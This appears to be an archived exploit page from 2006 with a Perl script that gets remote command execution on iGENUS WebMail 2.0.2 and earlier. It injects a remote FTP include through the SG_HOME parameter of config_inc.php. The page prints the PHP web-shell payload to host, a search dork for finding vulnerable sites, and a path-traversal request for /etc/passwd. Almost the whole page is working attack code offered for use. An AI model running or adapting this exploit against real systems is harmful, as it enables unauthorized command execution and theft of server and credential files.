<html><head><title>iGENUS WebMail <= 2.0.2 (config_inc.php) Remote Code Execution Exploit</title></head><pre>#!/usr/bin/perl
use IO::Socket;

print &quot;______________________________________________________\r\n&quot;;
print &quot;iGENUS WebMail &lt;= 2.0.2 remote commads xctn\r\n&quot;;
print &quot;-&gt; works against PHP5 with register_globals = On\r\n&quot;;
print &quot;   &amp; allow_url_fopen = On\r\n&quot;;
print &quot;by rgod rgod&lt;AT&gt;autistici&lt;DOT&gt;org\r\n&quot;;
print &quot;site: http://retrogod.altervista.org\r\n\r\n&quot;;
print &quot;dork:  intitle:\&quot;igenus webmail login\&quot;\r\n&quot;;
print &quot;______________________________________________________\r\n&quot;;

sub main::urlEncode {
    my ($string) = @_;
    $string =~ s/(\W)/&quot;%&quot; . unpack(&quot;H2&quot;, $1)/ge;
    #$string# =~ tr/.//;
    return $string;
 }

$serv=$ARGV[0];
$path=$ARGV[1];
$loc=urlEncode($ARGV[2]);
$cmd=&quot;&quot;; for ($i=3; $i&lt;=$#ARGV; $i++) {$cmd.=&quot;%20&quot;.urlEncode($ARGV[$i]);};

if (@ARGV &lt; 4)
{
print &quot;\r\nUsage:\r\n&quot;;
print &quot;perl igenus_xpl.pl SERVER PATH FTP_LOCATION COMMAND\r\n\r\n&quot;;
print &quot;SERVER         - Server where iGENUS is installed.\r\n&quot;;
print &quot;PATH           - Path to iGENUS (ex: /igenus/ or just /) \r\n&quot;;
print &quot;FTP_LOCATION   - an FTP site with the code to include\r\n&quot;;
print &quot;COMMAND        - a Unix command\r\n\r\n&quot;;
print &quot;Example:\r\n&quot;;
print &quot;perl igenus_xpl.pl localhost /igenus/ ftp://username:password/somehost.com ls -la\r\n&quot;;
print &quot;perl igenus_xpl.pl localhost /igenus/ ftp://username:password/somehost.com/subdir cat config_inc.php\r\n\r\n&quot;;
print &quot;note: on ftp location you need this code in .config :\r\n&quot;;
print &quot;&lt;?php ob_clean();ini_set(\&quot;max_execution_time\&quot;,0);passthru(\$_GET[\&quot;cmd\&quot;]);die;?&gt;\r\n\r\n&quot;;
exit();
}

  $sock = IO::Socket::INET-&gt;new(Proto=&gt;&quot;tcp&quot;, PeerAddr=&gt;&quot;$serv&quot;, Timeout  =&gt; 10, PeerPort=&gt;&quot;http(80)&quot;)
  or die &quot;[+] Connecting ... Could not connect to host.\n\n&quot;;
  print $sock &quot;GET &quot;.$path.&quot;config/config_inc.php?cmd=&quot;.$cmd.&quot;&amp;SG_HOME=&quot;.$loc.&quot; HTTP/1.1\r\n&quot;;
  print $sock &quot;Host: &quot;.$serv.&quot;\r\n&quot;;
  print $sock &quot;Connection: close\r\n\r\n&quot;;

  while ($answer = &lt;$sock&gt;) {
    print $answer;
  }
  close($sock);

# ----------------&gt; also, with magic_quotes_gpc = Off, try this:
# http://[target]/[path]/?Lang=../../../../../../../../etc/passwd%00

# milw0rm.com [2006-02-25]</pre></html>